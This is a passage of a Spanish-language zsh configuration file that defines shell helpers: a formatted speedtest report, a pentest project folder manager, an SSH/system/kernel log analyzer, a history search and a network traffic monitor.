            testing_line=$(grep "Testing from" "$server_temp" 2>/dev/null | head -1)
            server_line=$(grep "Hosted by" "$server_temp" 2>/dev/null | head -1)
            rm -f "$server_temp"
        fi

        # Extraer ISP: "Testing from ISP (IP)..."
        if [[ -n "$testing_line" ]]; then
            local isp=$(echo "$testing_line" | sed -n 's/Testing from \(.*\) (\([0-9.]*\)).*/\1/p' | xargs)
        else
            local isp="No disponible"
        fi

        # Extraer servidor: "Hosted by Mundo Chile (Cerro Navia) [8.68 km]: 57.218 ms"
        if [[ -n "$server_line" ]]; then
            # Extraer empresa y ubicación entre paréntesis
            local server=$(echo "$server_line" | sed -n 's/Hosted by \([^(]*\)(\([^)]*\)).*/\1\2/p' | xargs)
            # Extraer distancia
            local distance=$(echo "$server_line" | sed -n 's/.*\[\([0-9.]*\) km\].*/\1 km/p')
            [[ -n "$distance" ]] && server="$server ($distance)"
        else
            local server="No disponible"
        fi

        local jitter="N/A"
        local packet_loss="N/A"
        local result_url=""
    fi

    # Validar que tenemos datos
    if [[ -z "$ping" ]] || [[ -z "$download" ]] || [[ -z "$upload" ]]; then
        echo -e "${RED}Error: No se pudieron obtener datos del speedtest${NC}"
        cat "$temp_file"
        rm "$temp_file"
        return 1
    fi

    # Convertir a números para comparaciones
    local ping_num=$(echo "$ping" | sed 's/[^0-9.]//g')
    local download_num=$(echo "$download" | sed 's/[^0-9.]//g')
    local upload_num=$(echo "$upload" | sed 's/[^0-9.]//g')

    # Evaluación de ping
    local ping_quality=""
    local ping_color=""
    if (( $(echo "$ping_num > 100" | bc -l) )); then
        ping_quality="Malo"
        ping_color="${RED}"
    elif (( $(echo "$ping_num > 50" | bc -l) )); then
        ping_quality="Regular"
        ping_color="${ORANGE}"
    elif (( $(echo "$ping_num > 20" | bc -l) )); then
        ping_quality="Bueno"
        ping_color="${YELLOW}"
    else
        ping_quality="Excelente"
        ping_color="${GREEN}"
    fi

    # Evaluación de descarga
    local download_quality=""
    local download_color=""
    if (( $(echo "$download_num > 200" | bc -l) )); then
        download_quality="Extraordinaria"
        download_color="${PINK}"
    elif (( $(echo "$download_num > 100" | bc -l) )); then
        download_quality="Excelente"
        download_color="${BRIGHT_CYAN}"
    elif (( $(echo "$download_num > 50" | bc -l) )); then
        download_quality="Buena"
        download_color="${GREEN}"
    elif (( $(echo "$download_num > 20" | bc -l) )); then
        download_quality="Regular"
        download_color="${YELLOW}"
    else
        download_quality="Baja"
        download_color="${RED}"
    fi

    # Evaluación de subida
    local upload_quality=""
    local upload_color=""
    if (( $(echo "$upload_num > 100" | bc -l) )); then
        upload_quality="Extraordinaria"
        upload_color="${PINK}"
    elif (( $(echo "$upload_num > 50" | bc -l) )); then
        upload_quality="Excelente"
        upload_color="${BRIGHT_CYAN}"
    elif (( $(echo "$upload_num > 20" | bc -l) )); then
        upload_quality="Buena"
        upload_color="${GREEN}"
    elif (( $(echo "$upload_num > 10" | bc -l) )); then
        upload_quality="Regular"
        upload_color="${YELLOW}"
    else
        upload_quality="Baja"
        upload_color="${RED}"
    fi

    # Mostrar resultados principales
    echo -e "${PINK}╔═════════════════════════════════════════════════════════╗${NC}"
    # Emoji 📊 = 2 espacios, texto 36, total 38, espacios = 19 (2 adelante + 17 atrás)
    printf "${PINK}║${NC}  ${BOLD}${YELLOW}📊 RESULTADOS DEL TEST DE VELOCIDAD${NC}                 ${PINK}║${NC}\n"
    echo -e "${PINK}╠═════════════════════════════════════════════════════════╣${NC}"

    # Servidor e ISP (mostrar si hay información disponible)
    local show_separator=false
    if [[ "$server" != "No disponible" ]] && [[ -n "$server" ]]; then
        # 57 - "Servidor: " (10) = 47 caracteres para el valor
        local server_line_text="Servidor: ${server}"
        local server_spaces=$(( 57 - ${#server_line_text} ))
        printf "${PINK}║${NC} Servidor: ${GREEN}%s${NC}%*s${PINK}║${NC}\n" "$server" "$server_spaces" ""
        show_separator=true
    fi
    if [[ "$isp" != "No disponible" ]] && [[ -n "$isp" ]]; then
        # 57 - "ISP: " (5) = 52 caracteres para el valor
        local isp_line_text="ISP: ${isp}"
        local isp_spaces=$(( 57 - ${#isp_line_text} ))
        printf "${PINK}║${NC} ISP: ${GREEN}%s${NC}%*s${PINK}║${NC}\n" "$isp" "$isp_spaces" ""
        show_separator=true
    fi

    if [[ "$show_separator" == true ]]; then
        echo -e "${PINK}╠═════════════════════════════════════════════════════════╣${NC}"
    fi

    # Ping - Con espaciado calculado correctamente
    local ping_line="Latencia: ${ping} ms - Calidad: ${ping_quality}"
    local ping_spaces=$(( 57 - ${#ping_line} ))
    printf "${PINK}║${NC} Latencia: ${ping_color}%s ms${NC} - Calidad: ${ping_color}%s${NC}%*s${PINK}║${NC}\n" "$ping" "$ping_quality" "$ping_spaces" ""

    if [[ "$jitter" != "N/A" ]] && [[ -n "$jitter" ]]; then
        local jitter_line="Jitter: ${jitter} ms"
        local jitter_spaces=$(( 57 - ${#jitter_line} ))
        printf "${PINK}║${NC} Jitter: ${YELLOW}%s ms${NC}%*s${PINK}║${NC}\n" "$jitter" "$jitter_spaces" ""
    fi

    if [[ "$packet_loss" != "N/A" ]] && [[ -n "$packet_loss" ]] && [[ "$packet_loss" != "0" ]]; then
        local loss_line="Pérdida de paquetes: ${packet_loss}%"
        local loss_spaces=$(( 57 - ${#loss_line} ))
        printf "${PINK}║${NC} Pérdida de paquetes: ${RED}%s%%${NC}%*s${PINK}║${NC}\n" "$packet_loss" "$loss_spaces" ""
    fi

    echo -e "${PINK}╠═════════════════════════════════════════════════════════╣${NC}"

    # Descarga
    local download_percent=$(echo "$download_num" | awk '{if($1>500) print 100; else print int($1/5)}')
    local bar_length=$((download_percent / 5))
    if [[ $bar_length -gt 20 ]]; then bar_length=20; fi

    local download_bar=$(printf "█%.0s" $(seq 1 $bar_length) 2>/dev/null)
    local empty_bar=$(printf "░%.0s" $(seq 1 $((20 - bar_length))) 2>/dev/null)

    # Línea de descarga con espacios calculados
    local down_line="Descarga: ${download} Mbps - ${download_quality}"
    local down_spaces=$(( 57 - ${#down_line} ))
    printf "${PINK}║${NC} Descarga: ${download_color}%s Mbps${NC} - ${download_color}%s${NC}%*s${PINK}║${NC}\n" \
        "$download" "$download_quality" "$down_spaces" ""

    # Barra de progreso
    local bar_line="   [${download_bar}${empty_bar}] ${download_percent}%"
    local bar_spaces=$(( 57 - 4 - 20 - 3 - ${#download_percent} ))
    printf "${PINK}║${NC}   [${download_color}%s${NC}%s] %s%%%*s${PINK}║${NC}\n" \
        "$download_bar" "$empty_bar" "$download_percent" "$bar_spaces" ""

    echo -e "${PINK}╠═════════════════════════════════════════════════════════╣${NC}"

    # Subida
    local upload_percent=$(echo "$upload_num" | awk '{if($1>500) print 100; else print int($1/5)}')
    local bar_length=$((upload_percent / 5))
    if [[ $bar_length -gt 20 ]]; then bar_length=20; fi

    local upload_bar=$(printf "█%.0s" $(seq 1 $bar_length) 2>/dev/null)
    local empty_bar=$(printf "░%.0s" $(seq 1 $((20 - bar_length))) 2>/dev/null)

    # Línea de subida con espacios calculados
    local up_line="Subida: ${upload} Mbps - ${upload_quality}"
    local up_spaces=$(( 57 - ${#up_line} ))
    printf "${PINK}║${NC} Subida: ${upload_color}%s Mbps${NC} - ${upload_color}%s${NC}%*s${PINK}║${NC}\n" \
        "$upload" "$upload_quality" "$up_spaces" ""

    # Barra de progreso
    local bar_spaces=$(( 57 - 4 - 20 - 3 - ${#upload_percent} ))
    printf "${PINK}║${NC}   [${upload_color}%s${NC}%s] %s%%%*s${PINK}║${NC}\n" \
        "$upload_bar" "$empty_bar" "$upload_percent" "$bar_spaces" ""

    echo -e "${PINK}╚═════════════════════════════════════════════════════════╝${NC}"

    # Recomendaciones
    echo ""
    echo -e "${BOLD}${BRIGHT_CYAN}💡 Uso recomendado con esta conexión:${NC}"
    if (( $(echo "$download_num > 100" | bc -l) )); then
        echo -e "   ${GREEN}✓${NC} Streaming 4K/8K sin problemas"
        echo -e "   ${GREEN}✓${NC} Gaming online con latencia mínima"
        echo -e "   ${GREEN}✓${NC} Videoconferencias HD múltiples"
    elif (( $(echo "$download_num > 50" | bc -l) )); then
        echo -e "   ${GREEN}✓${NC} Streaming HD/4K"
        echo -e "   ${GREEN}✓${NC} Gaming online"
        echo -e "   ${YELLOW}⚠${NC}  Múltiples dispositivos pueden saturar"
    elif (( $(echo "$download_num > 20" | bc -l) )); then
        echo -e "   ${GREEN}✓${NC} Streaming HD"
        echo -e "   ${YELLOW}⚠${NC}  Gaming puede tener lag ocasional"
    else
        echo -e "   ${YELLOW}⚠${NC}  Streaming en calidad estándar"
        echo -e "   ${RED}✗${NC} No recomendado para gaming"
    fi

    # Guardar historial
    local history_file="$HOME/.speedtest_history"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "$timestamp | Ping: $ping ms | Download: $download Mbps | Upload: $upload Mbps | IP: $public_ip" >> "$history_file"

    echo ""
    echo -e "${BRIGHT_CYAN}📝 Resultado guardado en: ${PURPLE}${history_file}${NC}"

    if [[ -n "$result_url" ]]; then
        echo -e "${BRIGHT_CYAN}🔗 Ver resultado: ${YELLOW}$result_url${NC}"
    fi

    # Historial
    if [[ -f "$history_file" ]]; then
        local count=$(wc -l < "$history_file")
        if [[ $count -gt 1 ]]; then
            echo ""
            echo -e "${BOLD}${PURPLE}📈 Historial (últimos 5 tests):${NC}"
            # Usar /usr/bin/tail directamente para evitar el alias colortail
            /usr/bin/tail -n 5 "$history_file" | while IFS='|' read -r ts ping_h down_h up_h ip_h; do
                echo -e "   ${PINK}•${NC} $ts ${YELLOW}|${NC} $ping_h ${YELLOW}|${NC} $down_h ${YELLOW}|${NC} $up_h"
            done
        fi
    fi

    rm "$temp_file"
    echo ""
}

# Alias para la versión mejorada de speedtest
alias speedtest="speedtest_mejorado"

# Gestor de proyectos de pentesting
pentest_manager() {
    local action="$1"
    local project_name="$2"
    local base_dir="$HOME/pentests"

    # Comprobar que tenemos los directorios necesarios
    mkdir -p "$base_dir"

    case "$action" in
        "create"|"new")
            if [[ -z "$project_name" ]]; then
                echo -e "${RED}Error: Debes especificar un nombre para el proyecto${NC}"
                echo -e "Uso: ${CYAN}pentest_manager create <nombre_proyecto>${NC}"
                return 1
            fi

            local project_dir="$base_dir/$project_name"

            if [[ -d "$project_dir" ]]; then
                echo -e "${RED}Error: El proyecto '$project_name' ya existe${NC}"
                return 1
            fi

            echo -e "${CYAN}⏳ Creando proyecto: $project_name${NC}\n"

            # Crear estructura de directorios
            mkdir -p "$project_dir"/{nmap,content,exploits,scripts,evidencias/{screenshots,docs},notas,credenciales}

            # Crear archivos README
            echo "# Proyecto: $project_name" > "$project_dir/README.md"
            echo "Fecha de inicio: $(date +'%Y-%m-%d')" >> "$project_dir/README.md"
            echo "## Notas" > "$project_dir/notas/README.md"

            echo -e "${GREEN}✓ Proyecto '$project_name' creado exitosamente en:${NC}"
            echo -e "${YELLOW}$project_dir${NC}\n"

            # Mostrar estructura
            echo -e "${CYAN}Estructura del proyecto:${NC}"
            find "$project_dir" -type d | sort | sed -e "s|$base_dir/||" -e 's/^/  /'

            echo -e "\n${CYAN}ℹ️  Usa 'pentest_manager open $project_name' para abrir el proyecto${NC}"
            ;;

        "list"|"ls")
            echo -e "${BLUE}╔══════════════════════════════════════════════════════╗${NC}"
            echo -e "${BLUE}║${NC} ${YELLOW}PROYECTOS DE PENTESTING${NC}                              ${BLUE}║${NC}"
            echo -e "${BLUE}╚══════════════════════════════════════════════════════╝${NC}\n"

            if [[ ! "$(ls -A $base_dir 2>/dev/null)" ]]; then
                echo -e "${YELLOW}No hay proyectos creados aún.${NC}"
                echo -e "${CYAN}ℹ️  Usa 'pentest_manager create <nombre_proyecto>' para crear uno${NC}"
                return 0
            fi

            echo -e "${BLUE}╔════════════════════╦════════════════╦══════════════════╗${NC}"
            echo -e "${BLUE}║${NC} ${BOLD}Nombre${NC}             ${BLUE}║${NC} ${BOLD}Fecha${NC}           ${BLUE}║${NC} ${BOLD}Tamaño${NC}             ${BLUE}║${NC}"
            echo -e "${BLUE}╠════════════════════╬════════════════╬══════════════════╣${NC}"

            for project in "$base_dir"/*; do
                if [[ -d "$project" ]]; then
                    local name=$(basename "$project")
                    local date=$(stat -c "%y" "$project" | cut -d' ' -f1)
                    local size=$(du -sh "$project" | cut -f1)

                    printf "${BLUE}║${NC} ${GREEN}%-18s${BLUE}║${NC} ${YELLOW}%-16s${BLUE}║${NC} ${CYAN}%-18s${BLUE}║${NC}\n" "$name" "$date" "$size"
                fi
            done

            echo -e "${BLUE}╚════════════════════╩════════════════╩══════════════════╝${NC}\n"
            ;;

        "open")
            if [[ -z "$project_name" ]]; then
                echo -e "${RED}Error: Debes especificar un nombre de proyecto${NC}"
                echo -e "Uso: ${CYAN}pentest_manager open <nombre_proyecto>${NC}"
                return 1
            fi

            local project_dir="$base_dir/$project_name"

            if [[ ! -d "$project_dir" ]]; then
                echo -e "${RED}Error: El proyecto '$project_name' no existe${NC}"
                echo -e "${CYAN}ℹ️  Usa 'pentest_manager list' para ver los proyectos disponibles${NC}"
                return 1
            fi

            echo -e "${GREEN}✓ Abriendo proyecto: $project_name${NC}"
            cd "$project_dir"
            echo -e "${YELLOW}Directorio actual: $(pwd)${NC}\n"

            # Mostrar contenido del proyecto
            echo -e "${CYAN}Contenido del proyecto:${NC}"
            ls -la --color=auto
            ;;

        "delete"|"remove"|"rm")
            if [[ -z "$project_name" ]]; then
                echo -e "${RED}Error: Debes especificar un nombre de proyecto${NC}"
                echo -e "Uso: ${CYAN}pentest_manager delete <nombre_proyecto>${NC}"
                return 1
            fi

            local project_dir="$base_dir/$project_name"

            if [[ ! -d "$project_dir" ]]; then
                echo -e "${RED}Error: El proyecto '$project_name' no existe${NC}"
                return 1
            fi

            echo -e "${RED}⚠️  ¿Estás seguro de que quieres eliminar el proyecto '$project_name'?${NC}"
            echo -e "${RED}    Esta acción no se puede deshacer.${NC}"
            echo -n -e "${YELLOW}    Escribe 'SI' para confirmar: ${NC}"
            read confirm

            if [[ "$confirm" == "SI" ]]; then
                echo -e "${CYAN}⏳ Eliminando proyecto: $project_name${NC}"
                rm -rf "$project_dir"
                echo -e "${GREEN}✓ Proyecto eliminado exitosamente${NC}"
            else
                echo -e "${YELLOW}Operación cancelada${NC}"
            fi
            ;;

        "help"|*)
            echo -e "${BLUE}╔══════════════════════════════════════════════════════╗${NC}"
            echo -e "${BLUE}║${NC} ${YELLOW}GESTOR DE PROYECTOS DE PENTESTING${NC}                   ${BLUE}║${NC}"
            echo -e "${BLUE}╚══════════════════════════════════════════════════════╝${NC}\n"

            echo -e "${CYAN}Uso:${NC} pentest_manager <acción> [argumentos]"
            echo -e "\n${CYAN}Acciones disponibles:${NC}"
            echo -e "  ${GREEN}create, new${NC} <nombre>      Crea un nuevo proyecto de pentesting"
            echo -e "  ${GREEN}list, ls${NC}                 Lista todos los proyectos existentes"
            echo -e "  ${GREEN}open${NC} <nombre>           Abre un proyecto existente"
            echo -e "  ${GREEN}delete, remove, rm${NC} <nombre>  Elimina un proyecto existente"
            echo -e "  ${GREEN}help${NC}                    Muestra esta ayuda"

            echo -e "\n${CYAN}Ejemplos:${NC}"
            echo -e "  pentest_manager create cliente_xyz"
            echo -e "  pentest_manager list"
            echo -e "  pentest_manager open cliente_xyz"
            ;;
    esac
}

# Alias para el gestor de proyectos
alias pentm="pentest_manager"

# Análisis de logs del sistema
analyze_logs() {
    local log_type="${1:-auth}"  # Por defecto, analiza logs de autenticación
    local lines="${2:-100}"      # Por defecto, muestra las últimas 100 líneas

    echo -e "\n${BLUE}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC} ${YELLOW}ANALIZADOR DE LOGS DEL SISTEMA${NC}                      ${BLUE}║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════╝${NC}\n"

    case "$log_type" in
        "auth"|"autenticacion")
            echo -e "${CYAN}🔍 Analizando logs de autenticación (últimas $lines líneas)${NC}\n"

            # Verificar si el archivo existe
            if ! command -v journalctl &> /dev/null; then
                echo -e "${RED}Error: Archivo de log de autenticación no encontrado${NC}"
                return 1
            fi

            # Crear archivo temporal para procesar
            local temp_file=$(mktemp)
            journalctl -u sshd -n $lines --no-pager > "$temp_file"

            # Analizar intentos de login fallidos
            echo -e "${BOLD}${RED}INTENTOS DE LOGIN FALLIDOS:${NC}"
            grep "Failed password" "$temp_file" | awk '{print $1, $2, $3, "Usuario:", $9, "IP:", $11}' | sort | uniq -c | sort -nr | while read count rest; do
                echo -e "  ${RED}[$count]${NC} $rest"
            done

            # Analizar conexiones SSH exitosas
            echo -e "\n${BOLD}${GREEN}CONEXIONES SSH EXITOSAS:${NC}"
            grep "Accepted password\|Accepted publickey" "$temp_file" | awk '{print $1, $2, $3, "Usuario:", $9, "IP:", $11}' | sort | uniq -c | sort -nr | while read count rest; do
                echo -e "  ${GREEN}[$count]${NC} $rest"
            done

            # Analizar cambios de usuario (su)
            echo -e "\n${BOLD}${YELLOW}CAMBIOS DE USUARIO (su):${NC}"
            grep "su:" "$temp_file" | grep "session opened\|session closed" | awk '{print $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13}' | sort | uniq -c | sort -nr | while read count rest; do
                echo -e "  ${YELLOW}[$count]${NC} $rest"
            done

            # Analizar uso de sudo
            echo -e "\n${BOLD}${CYAN}USO DE SUDO:${NC}"
            grep "sudo:" "$temp_file" | grep "COMMAND" | awk '{print $1, $2, $3, "Usuario:", $5, "Comando:", $8, $9, $10, $11, $12, $13, $14, $15, $16}' | sort | uniq -c | sort -nr | while read count rest; do
                echo -e "  ${CYAN}[$count]${NC} $rest"
            done

            rm "$temp_file"
            ;;

        "system"|"sistema")
            echo -e "${CYAN}🔍 Analizando logs del sistema (últimas $lines líneas)${NC}\n"

            # Verificar si el archivo existe
            if ! command -v journalctl &> /dev/null; then
                echo -e "${RED}Error: Archivo de log del sistema no encontrado${NC}"
                return 1
            fi

            # Crear archivo temporal para procesar
            local temp_file=$(mktemp)
            journalctl -n $lines --no-pager > "$temp_file"

            # Analizar errores
            echo -e "${BOLD}${RED}ERRORES:${NC}"
            grep -i "error\|failed\|failure" "$temp_file" | awk '{print $1, $2, $3, $4, $5}' | sort | uniq -c | sort -nr | head -n 15 | while read count rest; do
                echo -e "  ${RED}[$count]${NC} $rest ..."
            done

            # Analizar advertencias
            echo -e "\n${BOLD}${YELLOW}ADVERTENCIAS:${NC}"
            grep -i "warning\|warn" "$temp_file" | awk '{print $1, $2, $3, $4, $5}' | sort | uniq -c | sort -nr | head -n 10 | while read count rest; do
                echo -e "  ${YELLOW}[$count]${NC} $rest ..."
            done

            # Analizar servicios
            echo -e "\n${BOLD}${GREEN}ACTIVIDAD DE SERVICIOS:${NC}"
            grep -i "service\|daemon\|started\|stopped" "$temp_file" | awk '{print $1, $2, $3, $4, $5, $6}' | sort | uniq -c | sort -nr | head -n 10 | while read count rest; do
                echo -e "  ${GREEN}[$count]${NC} $rest ..."
            done

            rm "$temp_file"
            ;;

        "kernel"|"nucleo")
            echo -e "${CYAN}🔍 Analizando logs del kernel (últimas $lines líneas)${NC}\n"

            # Verificar si el comando sudo dmesg está disponible
            if ! command -v sudo dmesg &> /dev/null; then
                echo -e "${RED}Error: Comando sudo dmesg no encontrado${NC}"
                return 1
            fi

            # Analizar errores del kernel
            echo -e "${BOLD}${RED}ERRORES DEL KERNEL:${NC}"
            sudo sudo dmesg | grep -i "error\|fail" | tail -n $lines | while read -r line; do
                echo -e "  ${RED}[!]${NC} $line"
            done

            # Analizar advertencias del kernel
            echo -e "\n${BOLD}${YELLOW}ADVERTENCIAS DEL KERNEL:${NC}"
            sudo sudo dmesg | grep -i "warning\|warn" | tail -n $lines | while read -r line; do
                echo -e "  ${YELLOW}[⚠]${NC} $line"
            done

            # Mostrar información de hardware
            echo -e "\n${BOLD}${CYAN}DETECCIÓN DE HARDWARE:${NC}"
            sudo sudo dmesg | grep -i "detected\|found\|nouveau\|nvidia\|radeon\|intel\|wifi\|eth\|usb" | tail -n $lines | while read -r line; do
                echo -e "  ${CYAN}[i]${NC} $line"
            done
            ;;

        "help"|*)
            echo -e "${CYAN}Uso:${NC} analyze_logs <tipo_log> [número_líneas]"
            echo -e "\n${CYAN}Tipos de logs disponibles:${NC}"
            echo -e "  ${GREEN}auth, autenticacion${NC}    Analiza logs de autenticación (/var/log/auth.log)"
            echo -e "  ${GREEN}system, sistema${NC}       Analiza logs del sistema (/var/log/syslog)"
            echo -e "  ${GREEN}kernel, nucleo${NC}        Analiza logs del kernel (sudo dmesg)"

            echo -e "\n${CYAN}Ejemplos:${NC}"
            echo -e "  analyze_logs auth 200      # Analiza las últimas 200 líneas de logs de autenticación"
            echo -e "  analyze_logs system        # Analiza las últimas 100 líneas de logs del sistema"
            echo -e "  analyze_logs kernel 50     # Analiza las últimas 50 líneas de logs del kernel"
            ;;
    esac
}

# Búsqueda mejorada en el historial
histsearch() {
    local query="$1"

    if [[ -z "$query" ]]; then
        echo -e "${RED}Error: Debes especificar un término de búsqueda${NC}"
        echo -e "Uso: ${CYAN}histsearch <término>${NC}"
        return 1
    fi

    echo -e "\n${BLUE}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC} ${YELLOW}BÚSQUEDA EN EL HISTORIAL${NC}                             ${BLUE}║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════╝${NC}\n"

    echo -e "${CYAN}🔍 Buscando: '${query}'${NC}\n"

    # Buscar en el historial
    local results=$(history 0 | grep -i "$query")
    local count=$(echo "$results" | grep -v "^$" | wc -l)

    if [[ $count -eq 0 ]]; then
        echo -e "${YELLOW}No se encontraron resultados para: '$query'${NC}"
        return 0
    fi

    echo -e "${BLUE}╔═════════╦══════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC} ${BOLD}Número${NC}  ${BLUE}║${NC} ${BOLD}Comando${NC}                                      ${BLUE}║${NC}"
    echo -e "${BLUE}╠═════════╬══════════════════════════════════════════════╣${NC}"

    # Mostrar resultados
    echo "$results" | grep -v "^$" | while read -r line; do
        local num=$(echo "$line" | awk '{print $1}')
        local cmd=$(echo "$line" | cut -d' ' -f2-)

        # Resaltar el término buscado
        local highlighted_cmd=$(echo "$cmd" | sed -E "s/($query)/\\${YELLOW}\\1\\${NC}/gi")

        printf "${BLUE}║${NC} ${CYAN}%-7s${BLUE}║${NC} %-46s ${BLUE}║${NC}\n" "$num" "$highlighted_cmd"
    done

    echo -e "${BLUE}╚═════════╩══════════════════════════════════════════════╝${NC}"

    echo -e "\n${GREEN}✓ Se encontraron $count coincidencias${NC}"
    echo -e "${CYAN}ℹ️  Para ejecutar un comando, usa:${NC} !<número>"
}

# Monitor de red
netmonitor() {
    local interface="${1:-$(ip route | grep '^default' | awk '{print $5}' | head -n1)}"
    local duration="${2:-60}"

    if [[ -z "$interface" ]]; then
        echo -e "${RED}Error: No se pudo determinar la interfaz de red predeterminada${NC}"
        echo -e "Uso: ${CYAN}netmonitor <interfaz> [duración_segundos]${NC}"
        return 1
    fi

    # Verificar que la interfaz existe
    if ! ip link show dev "$interface" &>/dev/null; then
        echo -e "${RED}Error: La interfaz '$interface' no existe${NC}"
        echo -e "${CYAN}Interfaces disponibles:${NC}"
        ip -o link show | grep -v 'lo:' | awk -F': ' '{print "  " $2}'
        return 1
    fi

    echo -e "\n${BLUE}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC} ${YELLOW}MONITOR DE RED${NC}                                      ${BLUE}║${NC}"
    echo -e "${BLUE}╠══════════════════════════════════════════════════════╣${NC}"
    echo -e "${BLUE}║${NC} Interfaz: ${GREEN}$interface${NC}"
    echo -e "${BLUE}║${NC} Duración: ${GREEN}$duration segundos${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════╝${NC}\n"

    echo -e "${CYAN}⏳ Iniciando monitoreo de red (presiona Ctrl+C para detener)...${NC}\n"

    # Datos iniciales
    local rx_bytes_start=$(cat /sys/class/net/$interface/statistics/rx_bytes)
    local tx_bytes_start=$(cat /sys/class/net/$interface/statistics/tx_bytes)
    local start_time=$(date +%s)
    local end_time=$((start_time + duration))

    # Encabezado de la tabla
    echo -e "${BLUE}╔════════════╦═════════════╦═════════════╦═════════════╦═════════════╗${NC}"
    echo -e "${BLUE}║${NC} ${BOLD}Tiempo${NC}     ${BLUE}║${NC} ${BOLD}Descarga${NC}    ${BLUE}║${NC} ${BOLD}Subida${NC}      ${BLUE}║${NC} ${BOLD}Total Desc.${NC}  ${BLUE}║${NC} ${BOLD}Total Sub.${NC}   ${BLUE}║${NC}"
    echo -e "${BLUE}╠════════════╬═════════════╬═════════════╬═════════════╬═════════════╣${NC}"

    local counter=0
    local rx_total=0
    local tx_total=0

    trap 'echo -e "\n${YELLOW}Monitoreo interrumpido por el usuario${NC}"; exit 0' INT

    # Loop principal
    while [[ $(date +%s) -le $end_time ]]; do
        sleep 1

        # Leer datos actuales
        local rx_bytes_now=$(cat /sys/class/net/$interface/statistics/rx_bytes)
        local tx_bytes_now=$(cat /sys/class/net/$interface/statistics/tx_bytes)

        # Calcular velocidad
        local rx_speed=$((rx_bytes_now - rx_bytes_start))
        local tx_speed=$((tx_bytes_now - tx_bytes_start))

        # Actualizar totales
        rx_total=$((rx_total + rx_speed))
        tx_total=$((tx_total + tx_speed))

        # Convertir a unidades legibles
        local rx_speed_human=$(numfmt --to=iec-i --suffix=B/s $rx_speed)
        local tx_speed_human=$(numfmt --to=iec-i --suffix=B/s $tx_speed)
        local rx_total_human=$(numfmt --to=iec-i --suffix=B $rx_total)
        local tx_total_human=$(numfmt --to=iec-i --suffix=B $tx_total)

        # Formatear tiempo
        local elapsed=$(($(date +%s) - start_time))
        local time_fmt=$(printf "%02d:%02d" $((elapsed / 60)) $((elapsed % 60)))

        # Imprimir resultados
        printf "${BLUE}║${NC} ${YELLOW}%-10s${BLUE}║${NC} ${GREEN}%-11s${BLUE}║${NC} ${CYAN}%-11s${BLUE}║${NC} ${GREEN}%-11s${BLUE}║${NC} ${CYAN}%-11s${BLUE}║${NC}\n" \
            "$time_fmt" "$rx_speed_human" "$tx_speed_human" "$rx_total_human" "$tx_total_human"

        # Actualizar valores iniciales
        rx_bytes_start=$rx_bytes_now
        tx_bytes_start=$tx_bytes_now

        counter=$((counter + 1))

        # Cada 15 líneas, repetir el encabezado
        if [[ $counter -eq 15 ]]; then
            echo -e "${BLUE}╠════════════╬═════════════╬═════════════╬═════════════╬═════════════╣${NC}"
            echo -e "${BLUE}║${NC} ${BOLD}Tiempo${NC}     ${BLUE}║${NC} ${BOLD}Descarga${NC}    ${BLUE}║${NC} ${BOLD}Subida${NC}      ${BLUE}║${NC} ${BOLD}Total Desc.${NC}  ${BLUE}║${NC} ${BOLD}Total Sub.${NC}    ${BLUE}║${NC}"
            echo -e "${BLUE}╠════════════╬═════════════╬═════════════╬═════════════╬═════════════╣${NC}"
            counter=0
        fi
    done

    trap - INT

    echo -e "${BLUE}╚════════════╩═════════════╩═════════════╩═════════════╩═════════════╝${NC}"

    # Mostrar resumen
    echo -e "\n${CYAN}📊 Resumen de monitoreo de red:${NC}"
    echo -e "  ${GREEN}Interfaz:${NC} $interface"
    echo -e "  ${GREEN}Duración:${NC} $elapsed segundos"
    echo -e "  ${GREEN}Datos descargados:${NC} $rx_total_human"
    echo -e "  ${GREEN}Datos subidos:${NC} $tx_total_human"
    echo -e "  ${GREEN}Total transferido:${NC} $(numfmt --to=iec-i --suffix=B $((rx_total + tx_total)))"

    # Calcular promedios
    if [[ $elapsed -gt 0 ]]; then
        local rx_avg=$((rx_total / elapsed))
        local tx_avg=$((tx_total / elapsed))
        echo -e "  ${GREEN}Velocidad promedio de descarga:${NC} $(numfmt --to=iec-i --suffix=B/s $rx_avg)"
        echo -e "  ${GREEN}Velocidad promedio de subida:${NC} $(numfmt --to=iec-i --suffix=B/s $tx_avg)"
    fi
}

# Función mejorada de man con colores
# Función mejorada de man con colores
function man() {
    env \
    LESS_TERMCAP_mb=$'\e[01;31m' \
    LESS_TERMCAP_md=$'\e[01;31m' \
    LESS_TERMCAP_me=$'\e[0m' \
    LESS_TERMCAP_se=$'\e[0m' \
    LESS_TERMCAP_so=$'\e[01;44;33m' \
    LESS_TERMCAP_ue=$'\e[0m' \
    LESS_TERMCAP_us=$'\e[01;32m' \
    man "$@"
}


# ---------- CARGA DE PLUGINS ----------

# Powerlevel10k (cargado una sola vez con verificación)
P10k_THEME="$HOME/powerlevel10k/powerlevel10k.zsh-theme"
[ -f "$P10k_THEME" ] && source "$P10k_THEME"

# Plugins de ZSH
[ -f /usr/share/zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ] && source /usr/share/zsh/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
[ -f /usr/share/zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh ] && source /usr/share/zsh/plugins/zsh-autosuggestions/zsh-autosuggestions.zsh
[ -f /usr/share/zsh/plugins/zsh-sudo/sudo.plugin.zsh ] && source /usr/share/zsh/plugins/zsh-sudo/sudo.plugin.zsh

# Configuración adicional
[[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh
[ -f ~/.fzf.zsh ] && source ~/.fzf.zsh
(( ! ${+functions[p10k-instant-prompt-finalize]} )) || p10k-instant-prompt-finalize

# Mensaje de bienvenida
echo -e "${BOLD}${GREEN}Bienvenido, P4NX0S!${NC}"

# Descomenta para ver el tiempo de carga
# zprof

export LIBVIRT_DEFAULT_URI="qemu:///system"
# Cargar script de gestión de VMs
if [[ -f "$HOME/bin/vm_sync.sh" ]]; then
  source "$HOME/bin/vm_sync.sh"
fi
